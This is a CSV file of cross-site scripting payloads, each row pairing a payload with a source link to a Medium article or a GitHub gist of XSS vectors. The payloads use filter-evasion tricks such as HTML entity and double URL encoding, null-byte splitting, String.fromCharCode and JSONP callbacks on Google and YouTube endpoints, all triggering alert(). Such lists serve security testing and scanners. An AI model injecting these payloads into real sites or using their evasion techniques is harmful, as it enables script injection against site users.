cve,tag,payload,url
,,"""><img src=x onerror=alert()>",https://medium.com/@bug_vs_me/all-about-xss-cross-site-scripting-1bf764a39159
,,&#x22;&#x3e;&#x3c;&#x69;&#x6d;&#x67;&#x20;&#x73;&#x72;&#x63;&#x3d;&#x78;&#x20;&#x6f;&#x6e;&#x65;&#x72;&#x72;&#x6f;&#x72;&#x3d;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x29;&#x3e;,https://medium.com/@bug_vs_me/all-about-xss-cross-site-scripting-1bf764a39160
,,<img src=x on%00err%00or=ale%00ert()>,https://medium.com/@bug_vs_me/all-about-xss-cross-site-scripting-1bf764a39161
,,<a href=”&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x29;”>xss</a>,https://medium.com/@bug_vs_me/all-about-xss-cross-site-scripting-1bf764a39162
,,"<a href=”javascript:this.innerHTML=String.fromCharCode(60,105,109,103,32,115,114,99,61,39,120,39,32,111,110,101,114,114,111,114,61,39,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41,59,39,62)”>xss</a>",https://medium.com/@bug_vs_me/all-about-xss-cross-site-scripting-1bf764a39163
,,"""><script src=”https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1""></script>",https://medium.com/@bug_vs_me/all-about-xss-cross-site-scripting-1bf764a39164
,,"<script src=”https://www.googleapis.com/customsearch/v1?callback=alert(1)"">",https://medium.com/@bug_vs_me/all-about-xss-cross-site-scripting-1bf764a39165
,,"“><script src=”https://www.youtube.com/oembed?callback=alert;https://www.youtube.com/oembed?callback=alert;""></script>",https://medium.com/@bug_vs_me/all-about-xss-cross-site-scripting-1bf764a39166
,,%22%3E%3Cimg/src/onerror=alert(0)%3E,https://medium.com/@bug_vs_me/all-about-xss-cross-site-scripting-1bf764a39167
,,%26quot;%26gt;%26lt;img%2Fsrc%2Fonerror%3Dalert()>,https://medium.com/@bug_vs_me/all-about-xss-cross-site-scripting-1bf764a39167
,XSS,%253Cscript%253Ealert('XSS')%253C%252Fscript%253E,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onload=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onafterprint=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onbeforeprint=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onbeforeunload=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onerror=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
